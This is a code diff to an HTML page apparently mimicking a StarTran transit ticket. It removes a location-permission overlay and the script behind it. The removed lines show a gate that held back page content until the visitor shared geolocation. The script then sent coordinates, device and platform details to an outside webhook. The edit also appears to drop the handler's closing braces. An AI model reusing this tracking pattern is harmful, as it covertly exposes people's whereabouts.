@@ -13,11 +13,13 @@
 </head>
 <body>
 	<!-- Start of Location Acknowledgement  -->
+	<!--
 	<div id="overlay">
 		<h1>This site requires your location</h1>
 		<p>Click Yes to continue</p>
 		<button id="allow" style="z-index:10000; position:relative;">Yes</button>
 	</div>
+		-->
 	<!-- End Location -->
 	
 	<!-- Start StarTran Ticket -->
@@ -120,58 +122,7 @@
 	document.addEventListener("DOMContentLoaded", () => {
 	console.log("DOM loaded");
 	
-	const overlay = document.getElementById("overlay");
 	const content = document.getElementById("content");
-	const allowBtn = document.getElementById("allow");
-	// When the accept button is hit
-	allowBtn.addEventListener("click", () => {
-	console.log("Yes clicked");
-	
-	if (!navigator.geolocation) {
-	alert("Geolocation not supported");
-	return;
-	}
-	
-	navigator.geolocation.getCurrentPosition(
-	(position) => {
-	console.log("Location granted", position);
-
-	// Unlock site
-	
-    overlay.style.display = "none";
-    content.style.display = "block";
-		
-	// Send webhook
-	const lat = position.coords.latitude;
-	const lng = position.coords.longitude;
-
-// Send POST to Hooklistener
-		fetch("https://app.hooklistener.com/w/my-first-endpoint-opbl", {
-		method: "POST",
-		headers: { "Content-Type": "application/json" },
-		body: JSON.stringify({
-		latitude: position.coords.latitude,
-		longitude: position.coords.longitude,
-		accuracy: position.coords.accuracy,
-		timestamp: getCentralTimeISO(),
-		device: navigator.userAgent,
-		platform: navigator.platform,
-		map: `https://www.google.com/maps?q=${lat},${lng}`
-		})
-		}).catch(err => console.error("Webhook error:", err));
-		},
-		(error) => {
-		console.error("Geolocation error:", error);
-		alert("Location permission is required to continue.");
-		},
-		{
-		enableHighAccuracy: false,
-		timeout: 10000,
-		maximumAge: 0
-		}
-	);
-	});
-});
 </script>
 </body>
 </html>
